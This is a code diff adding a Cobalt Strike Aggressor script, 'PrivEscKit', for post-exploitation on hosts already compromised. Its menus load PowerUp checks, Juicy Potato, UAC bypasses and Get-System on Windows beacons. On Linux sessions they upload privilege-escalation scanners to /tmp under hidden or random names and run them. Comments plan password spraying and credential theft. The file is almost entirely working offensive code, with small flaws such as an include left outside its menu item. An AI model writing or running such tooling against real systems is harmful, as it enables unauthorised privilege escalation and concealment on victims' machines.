@@ -1,0 +1,124 @@
+# Cobalt Strike Privilege Escalation Aggressor Script
+# TODO:
+#  Implement PowerUp Invoke-AllChecks
+#  Implement GPP plaintext cred finder
+#  Implement smb brute force module
+#
+#  MITRE ID: T1141
+#  Prompt user for password - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1141/T1141.yaml
+#  https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/collection/prompt.py
+#
+#  MITRE ID: T1038
+#  PowerSploit DLL Hijacking functionality
+#
+#  Password Spraying https://github.com/dafthack/DomainPasswordSpray
+#
+#  Domain user list generation https://github.com/dafthack/DomainPasswordSpray
+# 
+
+popup beacon_bottom{
+    menu "PrivEscKit" {
+        # invoke PowerSploit PowerUp.ps1
+        item "PowerUp All Checks"{
+            local('$bid');
+            foreach $bid ($1){
+                binput($bid, "powershell-import PowerUp.ps1");
+                bpowershell_import($bid, script_resource("modules/PowerUp.ps1"));
+                binput($bid, "powerpick Invoke-AllChecks");
+                bpowerpick($bid, "Invoke-AllChecks");
+            }
+        }
+
+        # include "ElevateKit from rsmurge"
+        item "ElevateKit"{
+            include(script_resource("scripts/elevate.cna"))
+        }
+        
+        # include"Juicy Potato"
+        # item "Juicy Potato(ms16-075)"{
+            include(script_resource("scripts/juicypotato.cna"))
+        # }
+        
+        # Bypass UAC  
+        menu "Bypass UAC"{
+            item "UACME"{
+                # TODO
+            }
+            
+            # uac-bypass-silentcleanup
+            item "uac-slientcleanup" {
+                include(script_resource("scripts/uac-silentcleanup.cna"))
+            }
+
+            # uac-bypass-filelessbypass
+            item "uac-filelessbypass" {
+                include(script_resource("scripts/uac-filelessbypass.cna"))
+            }
+
+            # get-system
+            item "Get-System" {
+                include(script_resource("scripts/get-system.cna"))
+            }
+        
+            item "Guest-to-Admin" {
+                include(script_resource("scripts/guest-to-admin.cna"))
+            }
+        }
+    }
+}
+
+
+popup ssh {
+    menu "PrivEscKit" {
+    menu "Scanners"{
+        item "Run LinEnum.sh"{
+            local('$bid');
+                foreach $bid ($1){
+                    bcd($1, "/tmp");
+                    bupload($1, script_resource("modules/scripts/LinEnum.sh"));
+                    bshell($1, "mv /tmp/LinEnum.sh /tmp/.AGq4yheattttt5y.sh");
+                    bshell($1, "chmod +x /tmp/.AGq4yheattttt5y.sh")
+                    bshell($1, "/tmp/.AGq4yheattttt5y.sh -t");
+                    blog($1, "Make sure you delete the /tmp/.AGq4yheattttt5y.sh file once the script is complete");	
+                }
+        }
+
+        item "Run unix-privesc-check"{
+            local('$bid');
+            foreach $bid ($1){
+                bcd($1, "/tmp");
+                bupload($1, script_resource("modules/unix-privesc-check"));
+                bshell($1, "mv /tmp/unix-privesc-check /tmp/.AGr5qgrakHSTR");
+                bshell($1, "chmod +x /tmp/.AGr5qgrakHSTR");
+                bshell($1, "/tmp/.AGr5qgrakHSTR detailed");
+                blog($1, "Make sure you delete the /tmp/.AGr5qgrakHSTR file once the script is complete");
+            }
+        }
+
+        item "Run linuxprivchecker.py"{
+            local('$bid');
+            foreach $bid ($1){
+                bcd($1, "/tmp");
+                bupload($1, script_resource("modules/linuxprivchecker.py"));
+                bshell($1, "mv /tmp/linuxprivchecker.py /tmp/AGa5qgrakHSTR.py");
+                bshell($1, "chmod +x /tmp/AGa5qgrakHSTR.py");
+                bshell($1, "/tmp/AGa5qgrakHSTR.py detailed");
+                blog($1, "Make sure you delete the /tmp/AGa5qgrakHSTR.py file once the script is complete");
+            }
+        }
+
+        item "Run privescalation.sh"{
+            local('$bid');
+            foreach $bid ($1){
+                bcd($1, "/tmp");
+                bupload($1, script_resource("modules/privescalation.sh"));
+                bshell($1, "mv /tmp/privescalation.sh /tmp/AGa5qgrbkHSTR.py");
+                bshell($1, "chmod +x /tmp/AGa5qgrbkHSTR.py");
+                bshell($1, "/tmp/AGa5qgrbkHSTR.py detailed");
+                blog($1, "Make sure you delete the /tmp/AGa5qgrbkHSTR.py file once the script is complete");
+            }
+        }
+
+        }
+    }
+}
